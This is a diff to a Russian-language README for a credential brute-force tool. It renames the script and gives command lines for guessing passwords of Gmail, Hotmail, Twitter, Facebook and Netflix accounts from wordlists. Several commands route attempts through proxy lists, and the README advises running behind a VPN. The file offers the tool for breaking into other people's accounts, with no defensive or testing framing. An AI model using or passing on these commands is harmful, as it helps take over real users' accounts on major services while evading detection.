@@ -18,44 +18,44 @@ pip3 install mechanize
 
 ## Брутфорс Gmail
 ```bash
-python3 Brute_Force.py -g Account@gmail.com -l File_list
+python3 Brute.py -g Account@gmail.com -l File_list
 
-python3 Brute_Force.py -g Account@gmail.com -p Password_Single
+python3 Brute.py -g Account@gmail.com -p Password_Single
 ```
 
 
 ## Брутфорс Hotmail
 ```bash
-python3 Brute_Force.py -t Account@hotmail.com -l File_list
+python3 Brute.py -t Account@hotmail.com -l File_list
 
-python3 Brute_Force.py -t Account@hotmail.com -p Password_Single
+python3 Brute.py -t Account@hotmail.com -p Password_Single
 ```
 
 
 ## Брутфорс Twitter
 
 ```bash
-python3 Brute_Force.py -T Account_Twitter -l File_list
-python3 Brute_Force.py -T Account_Twitter -l File_list -X proxy-list.txt
+python3 Brute.py -T Account_Twitter -l File_list
+python3 Brute.py -T Account_Twitter -l File_list -X proxy-list.txt
 
 ```
 ## Брутфорс Facebook
 
 ```bash
-python3 Brute_Force.py -f Account_facebook -l File_list
-python3 Brute_Force.py -f Account_facebook -l File_list -X proxy-list.txt
+python3 Brute.py -f Account_facebook -l File_list
+python3 Brute.py -f Account_facebook -l File_list -X proxy-list.txt
 ```
 ## Брутфорс Netflix
 
 ```bash
 
-Предпочтительно работает VPN
+Предпочтительно работаеть с VPN
 Start On Vpn
-python3 Brute_Force.py -n Account_Netflix -l File_list
-python3 Brute_Force.py -n Account_Netflix -l File_list -X proxy-list.txt
+python3 Brute.py -n Account_Netflix -l File_list
+python3 Brute.py -n Account_Netflix -l File_list -X proxy-list.txt
 
 
-И с нетерпением ждем большего(^-^) 
+И с нетерпением ждем ваши идеи(^-^) 
 ```
 
 
